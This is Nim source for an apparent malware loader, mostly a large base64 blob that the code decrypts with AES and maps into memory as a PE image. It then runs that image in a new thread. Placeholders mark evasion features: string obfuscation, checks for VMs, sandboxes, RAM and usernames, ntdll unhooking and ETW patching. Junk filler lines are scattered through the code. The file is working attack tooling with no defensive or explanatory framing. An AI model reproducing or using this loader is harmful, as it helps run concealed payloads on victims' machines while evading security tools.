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"


proc transferExecution*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE, hProcess: HANDLE) =
    someRandomStuffForReasons = 1 + 1

    var entryPoint = cast[LPTHREAD_START_ROUTINE](ntHeaders.OptionalHeader.AddressOfEntryPoint + cast[ULONGLONG](pImageBase))
    someRandomStuffForReasons = 1 + 1

    
    var thread = CreateThread(nil, cast[SIZE_T](0), entryPoint, nil, 0, nil)
    WaitForSingleObject(thread, cast[DWORD](0xFFFFFFFFF))


# Evasion
# Obfuscation
#@@StringObfuscation@@
# Sandbox
#@@SandboxMsgStart@@
#@@delayExecution@@
#@@sleepCheck@@
#@@checkVM@@
#@@checkRam@@
#@@checkUsername@@
#@@SandboxMsgEnd@@
# EDR
#@@unhookNtDll@@
#@@patchETW@@


proc decryptData(payload: string): seq[byte] =
    # Expand key to 32 bytes using SHA256 as the KDF
    someRandomStuffForReasons = 1 + 1

    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
    someRandomStuffForReasons = 1 + 1

    var dectext = newSeq[byte](len(payload))

    someRandomStuffForReasons = 1 + 1

    var str: string = decode(payload)
    ectx.init(key, iv)
    ectx.decrypt(toByteSeq(str), dectext)
    ectx.clear()
    return dectext

#@@userInput@@
proc NimMain() {.cdecl, importc.}

proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
    var hProcess = GetCurrentProcess()
    var payloadSeq = decryptData(encPayload)
    var lpBuffer: ptr = payloadSeq[0].addr

    var ntHeaders = getNtHeader(lpBuffer)
    var pImageBase = allocateMemory(ntHeaders, hProcess)
    mapPeSections(lpBuffer, ntHeaders, pImageBase)
    var performBaseReloc = checkPreferedAddress(ntHeaders, pImageBase)

    if performBaseReloc:
        var bReloc = baseRelocation(ntHeaders, pImageBase, hProcess)
        if bReloc: 
            someRandomStuffForReasons = 1 + 1

        else: 
            quit(-1)

    var fixIat = resolveImportAddressTable(ntHeaders, pImageBase)
    if fixIat: 
        someRandomStuffForReasons = 1 + 1

    else: 
        quit(-1)

    transferExecution(ntHeaders, pImageBase, hProcess)
    return 0

when isMainModule:
    discard main(NULL)

